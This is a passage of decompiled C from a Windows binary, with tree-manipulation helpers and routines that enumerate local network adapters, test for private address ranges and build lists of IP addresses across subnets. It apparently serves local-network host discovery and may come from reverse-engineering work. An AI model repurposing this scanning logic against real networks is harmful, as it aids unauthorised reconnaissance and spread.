                                        v58 = *(int32_t *)(*(int32_t *)(v7 + 4) + 4);
                                        v22 = v58;
                                        v53 = (int32_t *)(v58 + 8);
                                        v59 = *v53;
                                        v21 = v59;
                                        *v53 = *(int32_t *)v59;
                                        v54 = v21;
                                        v55 = *(int32_t *)v54;
                                        v56 = v54;
                                        if (v55 != g1178) {
                                          lab_0x408c76:
                                            // 0x408c76
                                            *(int32_t *)(v55 + 4) = v22;
                                            v56 = v21;
                                            // branch -> 0x408c79
                                        }
                                      lab_0x408c79:
                                        // 0x408c79
                                        *(int32_t *)(v56 + 4) = *(int32_t *)(v22 + 4);
                                        int32_t v68 = v22; // 0x408c82
                                        int32_t * v69 = (int32_t *)(*(int32_t *)(v2 + 4) + 4); // 0x408c82_0
                                        if (v68 == *v69) {
                                            // 0x408c87
                                            *v69 = v21;
                                            // branch -> 0x408c9a
                                        } else {
                                            int32_t v70 = *(int32_t *)(v68 + 4); // 0x408c8c
                                            int32_t * v71 = (int32_t *)v70; // 0x408c8f_0
                                            if (v68 == *v71) {
                                                // 0x408c93
                                                *v71 = v21;
                                                // branch -> 0x408c9a
                                            } else {
                                                // 0x408c97
                                                *(int32_t *)(v70 + 8) = v21;
                                                // branch -> 0x408c9a
                                            }
                                            // 0x408c9a
                                            *(int32_t *)v21 = v22;
                                            // branch -> 0x408c9c
                                            goto lab_0x408c9c_2;
                                        }
                                        // 0x408c9a
                                        *(int32_t *)v21 = v22;
                                        // branch -> 0x408c9c
                                        goto lab_0x408c9c_2;
                                    }
                                    // 0x408c45
                                    *(int32_t *)(v22 + 8) = v7;
                                    *(int32_t *)(v7 + 4) = v22;
                                    v64 = v7;
                                    // branch -> 0x408c4b
                                    goto lab_0x408c4b;
                                }
                                // 0x408c4b
                                *(int32_t *)(*(int32_t *)(v52 + 4) + 20) = 1;
                                v57 = *(int32_t *)(v7 + 4);
                                *(int32_t *)(*(int32_t *)(v57 + 4) + 20) = v8;
                                v58 = *(int32_t *)(*(int32_t *)(v7 + 4) + 4);
                                v22 = v58;
                                v53 = (int32_t *)(v58 + 8);
                                v59 = *v53;
                                v21 = v59;
                                *v53 = *(int32_t *)v59;
                                v54 = v21;
                                v55 = *(int32_t *)v54;
                                if (v55 == g1178) {
                                    v56 = v54;
                                    goto lab_0x408c79;
                                }
                                goto lab_0x408c76;
                            }
                            // 0x408c9f
                            v17 = v2;
                            v24 = *(int32_t *)(v17 + 4);
                            v25 = *(int32_t *)(v24 + 4);
                            if (v23 == v25) {
                                v18 = v17;
                                // break -> 0x408cab
                                break;
                            }
                            v16 = v17;
                            v14 = v23;
                            // continue -> 0x408afc
                            continue;
                        }
                        // 0x408c9f
                        v17 = v2;
                        v24 = *(int32_t *)(v17 + 4);
                        v25 = *(int32_t *)(v24 + 4);
                        if (v23 == v25) {
                            v18 = v17;
                            // break -> 0x408cab
                            break;
                        }
                        v16 = v17;
                        v14 = v23;
                        // continue -> 0x408afc
                        continue;
                    }
                    // 0x408cab
                    // branch -> 0x408cab
                    // 0x408cab
                    *(int32_t *)(*(int32_t *)(*(int32_t *)(v18 + 4) + 4) + 20) = 1;
                    *a1 = g1;
                    return result;
                }
                // 0x408cab
                // branch -> 0x408cab
                // 0x408cab
                *(int32_t *)(*(int32_t *)(*(int32_t *)(v17 + 4) + 4) + 20) = 1;
                *a1 = g1;
                return result;
            }
            // 0x408ad4
            *(int32_t *)v3 = g1;
            v12 = *(int32_t *)(v2 + 4);
            v9 = v3;
            if (v9 == v12) {
                // 0x408add
                *(int32_t *)(v12 + 4) = g1;
                *(int32_t *)(*(int32_t *)(v2 + 4) + 8) = g1;
                // branch -> 0x408aee
            } else {
                // 0x408ae8
                v5 = (int32_t *)v12;
                if (v9 == *v5) {
                    // 0x408aec
                    *v5 = g1;
                    // branch -> 0x408aee
                }
            }
            // 0x408aee
            v11 = v2;
            v10 = g1;
            v7 = v10;
            if (v10 == *(int32_t *)(*(int32_t *)(v11 + 4) + 4)) {
                // 0x408cab
                *(int32_t *)(*(int32_t *)(*(int32_t *)(v11 + 4) + 4) + 20) = 1;
                *a1 = g1;
                return result;
            }
            v14 = v10;
            while (true) {
                // 0x408afc
                v13 = *(int32_t *)(v14 + 4);
                v8 = 0;
                v6 = (int32_t *)(v13 + 20);
                if (*v6 == 0) {
                    goto lab_0x408b0a_2;
                }
                // 0x408cab
                // branch -> 0x408cab
                // 0x408cab
                *(int32_t *)(*(int32_t *)(*(int32_t *)(v11 + 4) + 4) + 20) = 1;
                *a1 = g1;
                return result;
            }
        }
    }
    // 0x408ad4
    *(int32_t *)v3 = g1;
    v12 = *(int32_t *)(v2 + 4);
    v9 = v3;
    if (v9 == v12) {
        // 0x408add
        *(int32_t *)(v12 + 4) = g1;
        *(int32_t *)(*(int32_t *)(v2 + 4) + 8) = g1;
        // branch -> 0x408aee
    } else {
        // 0x408ae8
        v5 = (int32_t *)v12;
        if (v9 == *v5) {
            // 0x408aec
            *v5 = g1;
            // branch -> 0x408aee
        }
    }
    // 0x408aee
    v11 = v2;
    v10 = g1;
    v7 = v10;
    if (v10 == *(int32_t *)(*(int32_t *)(v11 + 4) + 4)) {
        // 0x408cab
        *(int32_t *)(*(int32_t *)(*(int32_t *)(v11 + 4) + 4) + 20) = 1;
        *a1 = g1;
        return result;
    }
    v14 = v10;
    while (true) {
        // 0x408afc
        v13 = *(int32_t *)(v14 + 4);
        v8 = 0;
        v6 = (int32_t *)(v13 + 20);
        if (*v6 == 0) {
            goto lab_0x408b0a_2;
        }
        // 0x408cab
        // branch -> 0x408cab
        // 0x408cab
        *(int32_t *)(*(int32_t *)(*(int32_t *)(v11 + 4) + 4) + 20) = 1;
        *a1 = g1;
        return result;
    }
}

// Address range: 0x408cd0 - 0x408d2f
int32_t function_408cd0(int32_t a1, int32_t a2) {
    int32_t v1 = g7; // bp-4
    int32_t * v2 = (int32_t *)(a1 + 8); // 0x408cd5_0
    int32_t result = *v2; // 0x408cd5
    int32_t * v3 = (int32_t *)result; // 0x408cd8_0
    *v2 = *v3;
    int32_t v4 = *v3; // 0x408cdd
    if (v4 != g1178) {
        // 0x408ce7
        *(int32_t *)(v4 + 4) = a1;
        // branch -> 0x408cea
    }
    // 0x408cea
    *(int32_t *)(result + 4) = *(int32_t *)(a1 + 4);
    int32_t * v5 = (int32_t *)(*(int32_t *)(g4 + 4) + 4); // 0x408cf3_0
    if (a1 == *v5) {
        // 0x408cf8
        *v5 = result;
        *v3 = a1;
        *(int32_t *)(a1 + 4) = result;
        g7 = v1;
        return result;
    }
    int32_t v6 = *(int32_t *)(a1 + 4); // 0x408d04
    int32_t * v7 = (int32_t *)v6; // 0x408d07_0
    if (a1 == *v7) {
        // 0x408d0b
        *v7 = result;
        *v3 = a1;
        *(int32_t *)(a1 + 4) = result;
        g7 = v1;
        return result;
    }
    // 0x408d16
    *(int32_t *)(v6 + 8) = result;
    *v3 = a1;
    *(int32_t *)(a1 + 4) = result;
    g7 = v1;
    return result;
}

// Address range: 0x408d30 - 0x408d4f
int32_t function_408d30(int32_t * a1) {
    int32_t result = *a1; // 0x408d3a
    if (result == g1178) {
        // 0x408d48
        return (int32_t)a1;
    }
    int32_t v1 = *(int32_t *)result; // 0x408d42
    while (v1 != g1178) {
        // 0x408d40
        result = v1;
        v1 = *(int32_t *)result;
        // continue -> 0x408d40
    }
    // 0x408d48
    // branch -> 0x408d48
    // 0x408d48
    return result;
}

// Address range: 0x408d50 - 0x408daf
int32_t function_408d50(int32_t * a1, int32_t a2) {
    int32_t v1 = (int32_t)a1; // edx
    int32_t v2 = g7; // bp-4
    int32_t result = *a1; // 0x408d55
    int32_t * v3 = (int32_t *)(result + 8); // 0x408d57_0
    *a1 = *v3;
    int32_t v4 = *v3; // 0x408d5c
    if (v4 != g1178) {
        // 0x408d67
        *(int32_t *)(v4 + 4) = v1;
        // branch -> 0x408d6a
    }
    // 0x408d6a
    *(int32_t *)(result + 4) = *(int32_t *)(v1 + 4);
    int32_t * v5 = (int32_t *)(*(int32_t *)(g4 + 4) + 4); // 0x408d73_0
    if (v1 == *v5) {
        // 0x408d78
        *v5 = result;
        *v3 = v1;
        *(int32_t *)(v1 + 4) = result;
        g7 = v2;
        return result;
    }
    int32_t v6 = *(int32_t *)(v1 + 4); // 0x408d85
    int32_t * v7 = (int32_t *)(v6 + 8); // 0x408d88_0
    if (v1 == *v7) {
        // 0x408d8d
        *v7 = result;
        *v3 = v1;
        *(int32_t *)(v1 + 4) = result;
        g7 = v2;
        return result;
    }
    // 0x408d9a
    *(int32_t *)v6 = result;
    *v3 = v1;
    *(int32_t *)(v1 + 4) = result;
    g7 = v2;
    return result;
}

// Address range: 0x408db0 - 0x408dcf
int32_t function_408db0(int32_t result, int32_t a2, int32_t a3) {
    // 0x408db0
    _qm__qm_2_YAPAXI_Z(24);
    *(int32_t *)(g1 + 4) = result;
    *(int32_t *)(g1 + 20) = a2;
    return result;
}

// Address range: 0x408dd0 - 0x408e2f
int32_t function_408dd0(int32_t a1) {
    int32_t * v1 = (int32_t *)g4; // 0x408dd0_0
    int32_t v2 = *v1; // 0x408dd0
    int32_t v3 = g7; // 0x408dd2
    if (*(int32_t *)(v2 + 20) == 0) {
        // 0x408dda
        if (*(int32_t *)(*(int32_t *)(v2 + 4) + 4) == v2) {
            int32_t result = *(int32_t *)(v2 + 8); // 0x408de2
            g1 = result;
            g7 = v3;
            *v1 = result;
            return result;
        }
    }
    int32_t v4 = *(int32_t *)v2; // 0x408de9
    if (v4 == g1178) {
        int32_t v5 = *(int32_t *)(v2 + 4); // 0x408e09
        g1 = v5;
        int32_t v6 = v5; // 0x408e1d
        if (*v1 == *(int32_t *)v5) {
            *(int32_t *)g4 = v5;
            int32_t v7 = *(int32_t *)(g1 + 4); // 0x408e14
            g1 = v7;
            while (*(int32_t *)g4 == *(int32_t *)v7) {
                // 0x408e12
                *(int32_t *)g4 = v7;
                v7 = *(int32_t *)(g1 + 4);
                g1 = v7;
                // continue -> 0x408e12
            }
            // 0x408e1d
            v6 = v7;
            // branch -> 0x408e1d
        }
        // 0x408e1d
        *(int32_t *)g4 = v6;
        g7 = v3;
        return g1;
    }
    int32_t v8 = *(int32_t *)(v4 + 8); // 0x408df5
    g1 = v8;
    if (v8 == g1178) {
        // 0x408e05
        *v1 = v4;
        g7 = v3;
        return g1;
    }
    int32_t v9 = *(int32_t *)(v8 + 8); // 0x408dfe
    g1 = v9;
    while (v9 != g1178) {
        // 0x408dfc
        v8 = v9;
        v9 = *(int32_t *)(v8 + 8);
        g1 = v9;
        // continue -> 0x408dfc
    }
    // 0x408e05
    // branch -> 0x408e05
    // 0x408e05
    *v1 = v8;
    g7 = v3;
    return g1;
}

// Address range: 0x408e30 - 0x408e4f
int32_t function_408e30(int32_t * a1, int32_t * a2) {
    int32_t result = (int32_t)a1;
    if (a1 != NULL) {
        // 0x408e38
        *a1 = *a2;
        *(int32_t *)(result + 4) = *(int32_t *)((int32_t)a2 + 4);
        // branch -> 0x408e46
    }
    // 0x408e46
    return result;
}

// Address range: 0x408e50 - 0x40903f
int32_t function_408e50(int32_t a1, int32_t host_long, int32_t host_long2, int32_t a4) {
    int32_t v1 = g2; // 0x408e58
    int32_t v2 = g7; // 0x408e59
    int32_t v3 = host_long; // bp-24
    int32_t v4 = &v3; // 0x408e5a_0
    int32_t net_long = htonl(host_long); // esi
    v3 = host_long2;
    int32_t result = htonl(host_long2); // 0x408e67
    int32_t v5 = result; // ebp
    int32_t v6 = net_long; // ebx
    int32_t v7 = result; // bp-4
    if (net_long > result) {
        // 0x40902b
        g7 = v2;
        g2 = v1;
        return result;
    }
    // 0x408e80
    g7 = a1;
    v3 = g5;
    // branch -> 0x408e85
    int32_t result2; // eax
    while (true) {
        int32_t v8 = net_long & 255; // 0x408e87
        result2 = v8;
        int32_t v9; // 0x40901d
        if (net_long != 255) {
            // 0x408e92
            if (v8 != 255) {
                int32_t v10 = ntohl(net_long); // 0x408e9e
                int32_t v11 = g7; // 0x408ea3
                int32_t v12 = *(int32_t *)(v11 + 8); // 0x408eaa
                int32_t v13 = v12; // edi
                if (*(int32_t *)(v11 + 12) - v12 < 4) {
                    int32_t v14 = *(int32_t *)(v11 + 4); // 0x408ebd
                    int32_t v15;
                    int32_t v16; // 0x408ee260
                    if (v14 == 0) {
                        // 0x408ed9
                        v16 = 1;
                        v15 = 0;
                        // branch -> 0x408ee2
                    } else {
                        int32_t v17 = (v12 - v14) / 4; // 0x408ec8
                        int32_t v18 = v17; // 0x408ee261
                        if (v17 <= 1) {
                            // 0x408ed5
                            v18 = 1;
                            // branch -> 0x408edd
                        }
                        // 0x408edd
                        v16 = v18;
                        v15 = v17;
                        // branch -> 0x408ee2
                    }
                    int32_t v19 = v15 + v16; // 0x408ee2
                    int32_t v20 = v19; // 0x408eee
                    if (v19 <= 0xffffffff) {
                        // 0x408eec
                        v20 = 0;
                        // branch -> 0x408eee
                    }
                    int32_t v21 = 4 * v20; // 0x408eee
                    _qm__qm_2_YAPAXI_Z(v21);
                    int32_t v22 = *(int32_t *)(g7 + 4); // 0x408ef7
                    v5 = v22;
                    int32_t v23 = v21;
                    v6 = v21;
                    int32_t * v24;
                    int32_t v25; // 0x408f30
                    int32_t v26; // 0x408f40
                    int32_t v27; // 0x408f4c
                    int32_t v28; // 0x408f3a
                    int32_t v29; // 0x408f52
                    int32_t v30; // 0x408f60
                    int32_t v31; // 0x408f3a
                    int32_t v32; // 0x408f52
                    int32_t v33; // 0x408f60
                    if (v22 != v13) {
                        *(int32_t *)(v4 - 4) = v22;
                        *(int32_t *)(v4 - 8) = v6;
                        *(int32_t *)(v4 - 12) = 0x408f0e;
                        function_4090b0((int32_t *)v23, (int32_t *)v10);
                        int32_t v34 = v5 + 4; // 0x408f0e
                        int32_t v35 = g8 + 8; // 0x408f11
                        v6 += 4;
                        v4 = v35;
                        // branch -> 0x408f07
                        while (v34 != v13) {
                            // 0x408f07
                            v4 = v35;
                            *(int32_t *)(v4 - 4) = v34;
                            *(int32_t *)(v4 - 8) = v6;
                            *(int32_t *)(v4 - 12) = 0x408f0e;
                            function_4090b0((int32_t *)v23, (int32_t *)v10);
                            v34 += 4;
                            v35 = g8 + 8;
                            v6 += 4;
                            v4 = v35;
                            // continue -> 0x408f07
                        }
                        // 0x408f1b
                        *(int32_t *)(v4 - 4) = v4 + 32;
                        *(int32_t *)(v4 - 8) = 1;
                        *(int32_t *)(v4 - 12) = v6;
                        *(int32_t *)(v4 - 16) = 0x408f2a;
                        v24 = (int32_t *)net_long;
                        function_409080((int32_t *)v23, v10, v24, a4);
                        v25 = g8;
                        *(int32_t *)(v25 - 4) = v6 + 4;
                        *(int32_t *)(v25 - 8) = *(int32_t *)(g7 + 8);
                        *(int32_t *)(v25 - 12) = v13;
                        *(int32_t *)(v25 - 16) = 0x408f3a;
                        function_409050((int32_t *)v23, v10, v24, a4);
                        v28 = g7;
                        v31 = *(int32_t *)(v28 + 8);
                        g1 = v31;
                        v26 = g8;
                        *(int32_t *)(v26 - 4) = v31;
                        *(int32_t *)(v26 - 8) = *(int32_t *)(v28 + 4);
                        *(int32_t *)(v26 - 12) = 0x408f49;
                        function_409040();
                        v27 = g8;
                        *(int32_t *)(v27 - 4) = *(int32_t *)(g7 + 4);
                        *(int32_t *)(v27 - 8) = 0x408f52;
                        function_4097fe((char *)v23);
                        v29 = g8;
                        v32 = *(int32_t *)(v29 + 32);
                        v30 = g7;
                        v33 = *(int32_t *)(v30 + 4);
                        *(int32_t *)(v30 + 12) = 4 * *(int32_t *)(v29 + 20) + v32;
                        int32_t v36;
                        int32_t v37; // 0x408f82
                        if (v33 == 0) {
                          lab_0x408f6a:
                            // 0x408f6a
                            v37 = g7;
                            v36 = 0;
                            // branch -> 0x408f76
                        } else {
                          lab_0x408f6e:;
                            int32_t v38 = g7; // 0x408f6e
                            v37 = v38;
                            v36 = (*(int32_t *)(v38 + 8) - v33) / 4;
                            // branch -> 0x408f76
                        }
                        // 0x408f76
                        v5 = *(int32_t *)(g8 + 20);
                        v6 = *(int32_t *)(g8 + 36);
                        int32_t v39 = v32; // 0x408f7e
                        result2 = 4 * v36 + 4 + v39;
                        *(int32_t *)(v37 + 4) = v39;
                        *(int32_t *)(g7 + 8) = result2;
                        // branch -> 0x40901d
                      lab_0x40901d:
                        // 0x40901d
                        v9 = v6 + 1;
                        v6 = v9;
                        if (v9 > v5) {
                            // break -> 0x40902a
                            break;
                        }
                        net_long = v9;
                        // continue -> 0x408e85
                        continue;
                    }
                    // 0x408f1b
                    *(int32_t *)(v4 - 4) = v4 + 32;
                    *(int32_t *)(v4 - 8) = 1;
                    *(int32_t *)(v4 - 12) = v6;
                    *(int32_t *)(v4 - 16) = 0x408f2a;
                    v24 = (int32_t *)net_long;
                    function_409080((int32_t *)v23, v10, v24, a4);
                    v25 = g8;
                    *(int32_t *)(v25 - 4) = v6 + 4;
                    *(int32_t *)(v25 - 8) = *(int32_t *)(g7 + 8);
                    *(int32_t *)(v25 - 12) = v13;
                    *(int32_t *)(v25 - 16) = 0x408f3a;
                    function_409050((int32_t *)v23, v10, v24, a4);
                    v28 = g7;
                    v31 = *(int32_t *)(v28 + 8);
                    g1 = v31;
                    v26 = g8;
                    *(int32_t *)(v26 - 4) = v31;
                    *(int32_t *)(v26 - 8) = *(int32_t *)(v28 + 4);
                    *(int32_t *)(v26 - 12) = 0x408f49;
                    function_409040();
                    v27 = g8;
                    *(int32_t *)(v27 - 4) = *(int32_t *)(g7 + 4);
                    *(int32_t *)(v27 - 8) = 0x408f52;
                    function_4097fe((char *)v23);
                    v29 = g8;
                    v32 = *(int32_t *)(v29 + 32);
                    v30 = g7;
                    v33 = *(int32_t *)(v30 + 4);
                    *(int32_t *)(v30 + 12) = 4 * *(int32_t *)(v29 + 20) + v32;
                    if (v33 == 0) {
                        goto lab_0x408f6a;
                    }
                    goto lab_0x408f6e;
                } else {
                    // 0x408f99
                    function_409050((int32_t *)v12, v12, (int32_t *)(v12 + 4), v3);
                    int32_t v40 = *(int32_t *)(g7 + 8); // 0x408fa6
                    function_409080((int32_t *)v40, 1 - (v40 - v13) / 4, &v7, v12);
                    int32_t v41 = *(int32_t *)(g7 + 8); // 0x408fc5
                    result2 = v41;
                    int32_t v42 = v13; // 0x408fc8
                    if (v42 != v41) {
                        *(int32_t *)v42 = v1;
                        int32_t v43 = v13 + 4; // 0x408fd2
                        while (v43 != result2) {
                            // 0x408fcc
                            *(int32_t *)v43 = v1;
                            v43 += 4;
                            // continue -> 0x408fcc
                        }
                        // 0x409019
                        // branch -> 0x409019
                    }
                    int32_t * v44 = (int32_t *)(g7 + 8); // 0x409019_0
                    *v44 = *v44 + 4;
                    // branch -> 0x40901d
                    goto lab_0x40901d;
                }
            }
            // 0x40901d
            v9 = v6 + 1;
            v6 = v9;
            if (v9 > v5) {
                // break -> 0x40902a
                break;
            }
            net_long = v9;
            // continue -> 0x408e85
            continue;
        }
        // 0x40901d
        v9 = v6 + 1;
        v6 = v9;
        if (v9 > v5) {
            // break -> 0x40902a
            break;
        }
        net_long = v9;
        // continue -> 0x408e85
    }
    // 0x40902a
    g5 = v3;
    // branch -> 0x40902b
    // 0x40902b
    g7 = v2;
    g2 = v1;
    return result2;
}

// Address range: 0x409040 - 0x40904f
void function_409040(void) {
    // 0x409040
    return;
}

// Address range: 0x409050 - 0x40907f
int32_t function_409050(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4) {
    int32_t v1 = (int32_t)a1;
    int32_t result = (int32_t)a3;
    int32_t v2 = v1; // ecx
    int32_t v3 = result; // eax
    if (v1 == a2) {
        // 0x409077
        return result;
    }
    int32_t v4 = a2; // 0x40906f9
    // branch -> 0x409061
    int32_t result2; // 0x40906c
    while (true) {
        int32_t v5 = v4; // 0x40906f
        int32_t v6 = 0; // 0x40906c
        int32_t v7 = v1; // 0x409069
        if (result != 0) {
            // 0x409065
            *(int32_t *)result = *(int32_t *)v1;
            v5 = a2;
            v6 = v3;
            v7 = v2;
            // branch -> 0x409069
        }
        int32_t v8 = v7 + 4; // 0x409069
        v2 = v8;
        result2 = v6 + 4;
        v3 = result2;
        if (v8 == v5) {
            // break -> 0x409073
            break;
        }
        v4 = v5;
        v1 = v8;
        result = result2;
        // continue -> 0x409061
    }
    // 0x409073
    return result2;
}

// Address range: 0x409080 - 0x4090af
int32_t function_409080(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4) {
    // 0x409080
    if (a2 == 0) {
        // 0x4090a2
        return 0;
    }
    int32_t v1 = (int32_t)a1;
    // branch -> 0x409093
    int32_t result; // 0x40909b
    while (true) {
        int32_t v2 = 0; // 0x40909b
        if (v1 != 0) {
            // 0x409097
            *(int32_t *)v1 = *(int32_t *)(int32_t)a3;
            v2 = v1;
            // branch -> 0x40909b
        }
        // 0x40909b
        result = v2 + 4;
        int32_t v3 = a2 - 1; // 0x40909e
        if (v3 == 0) {
            // break -> 0x4090a1
            break;
        }
        a2 = v3;
        v1 = result;
        // continue -> 0x409093
    }
    // 0x4090a1
    // branch -> 0x4090a2
    // 0x4090a2
    return result;
}

// Address range: 0x4090b0 - 0x4090cf
int32_t function_4090b0(int32_t * a1, int32_t * a2) {
    // 0x4090b0
    if (a1 != NULL) {
        // 0x4090b8
        *a1 = *a2;
        // branch -> 0x4090c0
    }
    // 0x4090c0
    return (int32_t)a1;
}

// Address range: 0x4090d0 - 0x40910f
int32_t function_4090d0(int32_t host_long, int32_t host_long2, int32_t host_long3) {
    int32_t v1 = g5; // bp-8
    uint32_t v2 = htonl(host_long); // 0x4090d7
    int32_t v3;
    if (htonl(host_long2) > v2) {
        // 0x40910a
        g5 = v1;
        g7 = v3;
        return 0;
    }
    uint32_t v4 = htonl(host_long); // 0x4090ed
    if (v4 > htonl(host_long3)) {
        // 0x40910a
        g5 = v1;
        g7 = v3;
        return 0;
    }
    // 0x409102
    g5 = v1;
    g7 = v3;
    return 1;
}

// Address range: 0x409110 - 0x40915f
int32_t function_409110(int32_t host_long) {
    uint32_t v1 = htonl(host_long); // 0x409115
    if (v1 < 0xa000000) {
        // 0x40912e
        // branch -> 0x409142
        // 0x409142
        // branch -> 0x409156
        // 0x409156
        g1 = 0;
        return 0;
    }
    // 0x409121
    if (v1 <= 0xaffffff) {
        // 0x409128
        g1 = 1;
        return 1;
    }
    // 0x40912e
    if (v1 < 0xac100000) {
        // 0x409142
        // branch -> 0x409156
        // 0x409156
        g1 = 0;
        return 0;
    }
    // 0x409135
    if (v1 <= 0xac1fffff) {
        // 0x40913c
        g1 = 1;
        return 1;
    }
    // 0x409142
    if (v1 < 0xc0a80000 || v1 > 0xc0a8ffff) {
        // 0x409156
        g1 = 0;
        return 0;
    }
    // 0x409150
    g1 = 1;
    return 1;
}

// Address range: 0x409160 - 0x40946f
int32_t function_409160(char * cp, struct _IP_PER_ADAPTER_INFO_W2KSP1 * a2) {
    int32_t v1 = 0; // bp-20
    v1 = 0;
    if (GetAdaptersInfo(NULL, &v1) != 111) {
        // 0x4091ae
        return 0;
    }
    int32_t uBytes = v1; // 0x40917d
    if (uBytes == 0) {
        // 0x4091ae
        return 0;
    }
    char * memoryHandle = LocalAlloc(0, uBytes); // 0x409188
    g7 = (int32_t)memoryHandle;
    if (memoryHandle != NULL) {
        int32_t v2 = GetAdaptersInfo((struct _IP_ADAPTER_INFO *)memoryHandle, &v1); // 0x40919e
        g1 = v2;
        if (v2 != 0) {
            // 0x4091a7
            LocalFree((char *)g7);
            // branch -> 0x4091ae
            // 0x4091ae
            return 0;
        }
        int32_t v3 = g5;
        int32_t v4 = &v3; // 0x4091b7_0
        int32_t uBytes2 = (int32_t)a2;
        int32_t v5 = g7; // 0x4091be
        // branch -> 0x4091be
        while (true) {
            int32_t v6 = v5 + 428; // 0x4091be
            g5 = v6;
            int32_t v7; // 0x4093f5184
            int32_t v8; // 0x4093f5187
            int32_t v9; // 0x409441
            int32_t v10; // eax
            int32_t v11; // ecx
            int32_t v12;
            int32_t v13; // 0x4093c0
            int32_t v14; // 0x4093d2
            int32_t v15; // 0x4093e3
            int32_t v16; // 0x409410186
            int32_t v17; // 0x40941b
            int32_t v18; // 0x40941d
            int32_t v19; // 0x40941d89
            int32_t v20; // 0x409423
            int32_t v21; // 0x40942392
            int32_t v22; // 0x409434
            int32_t v23; // 0x40943a
            int32_t v24; // 0x40943f99
            int32_t v25; // 0x409444
            int32_t v26; // 0x40937b
            int32_t v27; // 0x4093c4
            int32_t v28; // 0x4093d2
            int32_t v29; // 0x40941b
            int32_t v30; // 0x40942d
            int32_t v31; // 0x4093b1
            int32_t v32; // 0x4093c9
            int32_t v33; // 0x4093e0
            int32_t v34; // 0x4093e9
            int32_t v35; // 0x40942a
            int32_t v36; // 0x409431
            int32_t v37; // 0x4093b1
            int32_t v38; // 0x4093c6
            int32_t v39; // 0x40938e
            int32_t v40; // 0x409391
            uint32_t v41; // 0x4093c6
            int32_t v42; // 0x4093e9
            int32_t v43; // 0x4093ec
            int32_t v44; // 0x409431
            if (v6 != 0) {
                while (true) {
                    int32_t v45 = inet_addr((char *)(v6 + 4));
                    int32_t v46 = inet_addr((char *)(g5 + 20)); // 0x4091e7
                    g1 = v46;
                    int32_t v47 = v45; // 0x4091ec
                    int32_t v48 = v4; // 0x409371
                    if (v47 != -1) {
                        // 0x4091f9
                        if (v47 != 0) {
                            // 0x409201
                            if (v46 != -1) {
                                // 0x40920a
                                if (v46 != 0) {
                                    int32_t v49 = v47 | -1 - v46; // 0x409216
                                    int32_t v50 = v47 & v46; // 0x409218
                                    g3 = v50;
                                    g2 = v49;
                                    function_408e50((int32_t)cp, v50, v49, v3);
                                    g4 = uBytes2;
                                    function_409470((int32_t *)*(int32_t *)(uBytes2 + 8), 1, &v45, v3);
                                    int32_t v51 = g7; // 0x40923f
                                    int32_t v52 = v51 + 468; // 0x40923f
                                    g5 = v52;
                                    int32_t v53 = g8; // 0x4092bd
                                    int32_t v54; // esi
                                    if (v52 != 0) {
                                        int32_t v55 = g8; // 0x40925d
                                        int32_t v56; // 0x40929d
                                        while (true) {
                                            int32_t * v57 = (int32_t *)(v55 - 4); // 0x40924c_0
                                            *v57 = v52 + 4;
                                            int32_t * v58 = (int32_t *)(v55 - 8); // 0x40924d_1
                                            *v58 = 0x409252;
                                            int32_t v59 = inet_addr(cp); // 0x40924d
                                            v54 = v59;
                                            v56 = v55;
                                            if (v59 != -1) {
                                                // 0x409259
                                                if (v59 != 0) {
                                                    // 0x40925d
                                                    *v57 = g2;
                                                    *v58 = g3;
                                                    *(int32_t *)(v55 - 12) = v54;
                                                    *(int32_t *)(v55 - 16) = 0x409265;
                                                    if (function_4090d0((int32_t)cp, uBytes2, 0) == 0) {
                                                        int32_t * v60 = (int32_t *)(g8 + 8); // 0x40926c_0
                                                        *v60 = g7;
                                                        int32_t * v61 = (int32_t *)(g8 + 4); // 0x40926d_1
                                                        *v61 = 0x409272;
                                                        *v60 = htonl((int32_t)cp) | 255;
                                                        *v61 = 0x40927a;
                                                        *v60 = ntohl((int32_t)cp);
                                                        *v61 = g7;
                                                        int32_t * v62 = (int32_t *)g8; // 0x40927c_1
                                                        *v62 = (int32_t)&g17;
                                                        *v61 = htonl((int32_t)cp) & -256;
                                                        *v62 = 0x409289;
                                                        *v61 = ntohl((int32_t)cp);
                                                        *v62 = *(int32_t *)(g8 + 52);
                                                        *(int32_t *)(g8 - 4) = 0x409294;
                                                        function_408e50((int32_t)cp, uBytes2, 0, 0);
                                                        v56 = g8 + 12;
                                                        // branch -> 0x409297
                                                    } else {
                                                        v56 = g8 + 12;
                                                    }
                                                } else {
                                                    v56 = v55;
                                                }
                                            }
                                            int32_t v63 = *(int32_t *)g5; // 0x409297
                                            g5 = v63;
                                            if (v63 == 0) {
                                                // break -> 0x40929d
                                                break;
                                            }
                                            v55 = v56;
                                            v52 = v63;
                                            // continue -> 0x409249
                                        }
                                        int32_t v64 = *(int32_t *)(v56 + 20); // 0x40929d
                                        g7 = v64;
                                        v53 = v56;
                                        v51 = v64;
                                        // branch -> 0x4092a1
                                    }
                                    int32_t v65 = v53 + 16; // 0x4092a7
                                    int32_t * v66 = (int32_t *)(v53 - 4); // 0x4092ab_0
                                    *v66 = v65;
                                    int32_t * v67 = (int32_t *)(v53 - 8); // 0x4092ac_0
                                    *v67 = 0;
                                    int32_t * v68 = (int32_t *)(v53 - 12); // 0x4092ae_0
                                    *v68 = *(int32_t *)(v51 + 412);
                                    *(int32_t *)(v53 - 16) = 0x4092b4;
                                    int32_t v69 = GetPerAdapterInfo((int32_t)cp, a2, NULL); // 0x4092af
                                    g1 = v69;
                                    int32_t v70 = v53; // 0x409369
                                    if (v69 == 111) {
                                        // 0x4092bd
                                        *v66 = *(int32_t *)v65;
                                        *v67 = 0;
                                        *v68 = (int32_t)&g18;
                                        char * memoryHandle2 = LocalAlloc((int32_t)cp, uBytes2); // 0x4092c4
                                        int32_t v71 = (int32_t)memoryHandle2; // 0x4092c4_7
                                        v54 = v71;
                                        *(int32_t *)(v53 + 32) = v71;
                                        int32_t v72 = g8; // 0x40935e
                                        if (memoryHandle2 != NULL) {
                                            // 0x4092d8
                                            *(int32_t *)(g8 - 4) = g8 + 16;
                                            *(int32_t *)(g8 - 8) = v54;
                                            *(int32_t *)(g8 - 12) = *(int32_t *)(*(int32_t *)(g8 + 20) + 412);
                                            *(int32_t *)(g8 - 16) = 0x4092ee;
                                            if (GetPerAdapterInfo((int32_t)cp, a2, NULL) != 0) {
                                                int32_t v73 = v54 + 12; // 0x4092f2
                                                g5 = v73;
                                                if (v73 != 0) {
                                                    int32_t v74 = g8; // 0x40930d
                                                    int32_t v75; // 0x40935a
                                                    while (true) {
